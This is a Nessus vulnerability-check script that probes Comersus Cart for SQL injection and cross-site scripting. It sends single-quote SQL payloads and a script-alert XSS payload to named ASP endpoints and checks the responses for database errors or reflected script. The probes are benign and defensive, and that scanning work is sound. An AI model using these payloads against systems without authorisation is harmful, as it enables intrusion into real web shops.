#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18643);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-2190", "CVE-2005-2191");
  script_bugtraq_id(14183, 14191);
  script_xref(name:"OSVDB", value:"17972");
  script_xref(name:"OSVDB", value:"17973");
  script_xref(name:"OSVDB", value:"17974");
  script_xref(name:"OSVDB", value:"17975");

  script_name(english:"Comersus Cart Multiple Vulnerabilities (SQLi, XSS)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP application that is affected by
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The version of Comersus Cart installed on the remote host suffers from
multiple SQL injection and cross-site scripting flaws due to its
failure to sanitize user-supplied input.  Attackers may be able to
exploit these flaws to influence database queries or cause arbitrary
HTML and script code to be executed in users' browsers within the
context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/404570/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_summary(english:"Checks for multiple vulnerabilities in Comersus Cart");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Define various exploits.
#
# - these exploits should just generate SQL syntax errors.
sql_exploits = make_list(
  string(
    "/comersus_optAffiliateRegistrationExec.asp?",
    "name=", rand() % 255, "&",
    "email=", SCRIPT_NAME, "'&",
    "Submit=Join%20now%21"
  ),
  string(
     "/comersus_optReviewReadExec.asp?",
    "idProduct=", SCRIPT_NAME, "'&",
    "description=nessus"
  )
);
# - these exploits should raise a simple alert.
xss = "<script>alert('" + SCRIPT_NAME + " was here');</script>";
#   nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "%20was%20here')%3B%3C%2Fscript%3E";
xss_exploits = make_list(
  string(
    "/comersus_backoffice_message.asp?",
    "message=>", exss
  ),
  string(
    "/comersus_backoffice_listAssignedPricesToCustomer.asp?",
    "idCustomer=", rand() % 255, "&",
    "name=>", exss
  )
);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Locate Comersus' user registration form.
  r = http_send_recv3(method: 'GET', item:string(dir, "/comersus_customerRegistrationForm.asp"), port:port);
  if (isnull(r)) exit(0);

  # Make sure it's definitely Comersus Cart.
  if ('<form method="post" name="cutR"' >< r[2]) {
    # Try the SQL exploits.
    foreach exploit (sql_exploits) {
      r = http_send_recv3(method: 'GET', item:exploit, port:port);
      if (isnull(r)) exit(0);

      # There's a problem if we get a syntax error.
      if ("Microsoft OLE DB Provider for ODBC Drivers error '80040e14'" >< r[2]) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }

    # Try the XSS exploits.
    if (get_kb_item("www/"+port+"/generic_xss")) break;

    foreach exploit (xss_exploits) {
      r = http_send_recv3(method: 'GET', item: dir+exploit, port:port);
      if (isnull(r)) exit(0);

      # There's a problem if we see our XSS.
      if (xss >< r[2]) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
